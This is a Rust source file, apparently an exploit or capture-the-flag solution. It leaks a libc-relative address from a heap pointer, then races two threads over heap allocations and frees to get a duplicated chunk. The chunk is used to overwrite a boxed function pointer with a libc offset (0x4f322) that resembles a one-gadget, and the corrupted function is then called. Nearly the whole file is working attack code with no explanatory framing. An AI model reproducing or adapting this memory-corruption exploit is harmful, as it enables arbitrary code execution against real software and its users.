const SIZE: usize = 1000;
const LOOP: usize = 3000;
fn g(f: fn(i32) -> i32) -> u64{
    // libc leak
    let heap = Box::new(0u64);

    let libc_addr = heap.as_ref() as *const u64 as u64 + 0x1ffff0;
    //println("libc_addr: {:x}", libc_addr);
    drop(heap);

    let target_func = Box::new(f);
    let target_func_addr = target_func.as_ref() as *const fn(i32) -> i32 as u64;

    let mut v = Vec::new();
    for i in 0..SIZE {
        v.push(0u64);
    }

    let vc = std::sync::Arc::new(std::sync::Mutex::new(v));
    let (tx1, rx1) = std::sync::mpsc::channel();
    let (tx2, rx2) = std::sync::mpsc::channel();

    let cs = std::sync::Arc::new(std::sync::Mutex::new(0));

    let vca = vc.clone();
    let cs1 = cs.clone();
    let a = std::thread::spawn(move || {
        'outer: for i in 0..LOOP{
            //println("a{}", i);
            let mut l = Vec::<Box<u64>>::new();
            for i in 0..SIZE {
                l.push(Box::new(0u64));
            }
            rx2.recv().unwrap();
            // check
            for target in l.iter_mut() {
                let x = target.as_ref() as *const u64 as u64;
                for i in 0..SIZE {
                    if x == vca.lock().unwrap()[i] {
                        tx1.send(Some(i)).unwrap();

                        rx2.recv().unwrap();
                        let dupped = Box::new(0u64);

                        //println("[a]found {:x}", x);
                        let mut victim = Box::new(0u64);
                        std::mem::swap(&mut victim, target);
                        //println("[a]victim {:x}", victim.as_ref() as *const u64 as u64);

                        //drop(victim);

                        let mut v = Vec::<Box<u64>>::new();
                        v.push(victim);
                        //println("before v[0]: {:x}", *v[0]);
                        for i in 0..100 {
                            let mut a = Box::new(115u64);
                            for w in v.iter() {
                                let x = w.as_ref() as *const u64 as u64;
                                let y = a.as_ref() as *const u64 as u64;
                                if x == y {
                                    //println("found {:x}", x);
                                    //println("after v[0]: {}", &v[0]);

                                    // do dup
                                    let mut victim1 = Box::new(1u64);
                                    let mut victim2 = Box::new(2u64);
                                    std::mem::swap(&mut victim1, &mut v[0]);
                                    std::mem::swap(&mut victim2, &mut a);

                                    let x = victim1.as_ref() as *const u64 as u64;
                                    let y = victim2.as_ref() as *const u64 as u64;
                                    //println("dup");
                                    //println("+ {:x}\n+ {:x}", x, y);
                                    drop(victim1);
                                    drop(victim2);

                                    let target_addr = target_func_addr - 0x10;
                                    let target_value = libc_addr + 0x4f322;
                                    let victim1 = Box::new(target_addr);
                                    let victim2 = Box::new(target_addr);
                                    let victim3 = Box::new(target_value);

                                    target_func(0);

                                    tx1.send(None).unwrap();
                                    break 'outer;
                                }
                            }
                            v.push(a);
                        }
                        //println("hmm");

                        tx1.send(None).unwrap();
                        break 'outer;
                    }
                }
            }
            tx1.send(None).unwrap();
        }
    });


    let vcb = vc.clone();
    let cs2 = cs.clone();
    let b = std::thread::spawn(move || {
        for i in 0..LOOP{
            //println("b{}", i);
            let mut l = Vec::new();
            for i in 0..SIZE {
                l.push(Box::new(0u64));
            }
            for (i, x) in l.iter().enumerate() {
                let x = x.as_ref() as *const u64 as u64;
                vcb.lock().unwrap()[i] = x;
            }
            tx2.send(0).unwrap();

            let x = rx1.recv().unwrap();
            if let Some(x) = x {
                //println("[b]found {} {:x}", x, l[x].as_ref() as *const u64 as u64);
                let mut victim = Box::new(0u64);
                std::mem::swap(&mut victim, &mut l[x]);
                //println("[b]victim {:x}", victim.as_ref() as *const u64 as u64);

                let pad = Box::new(0u64);
                let pad2 = Box::new(0u64);
                let pad3 = Box::new(0u64);

                {
                    let _ = cs2.lock().unwrap();
                    drop(victim);
                    drop(pad);
                    drop(pad2);
                }
                // end free of victim
                tx2.send(0).unwrap();

                rx1.recv().unwrap();
                break;
            }
        }
    });

    a.join().unwrap();
    b.join().unwrap();
    0
}

fn h(x: i32) -> i32 {
    x + 1
}

fn f() -> u64 {
    g(h)
}
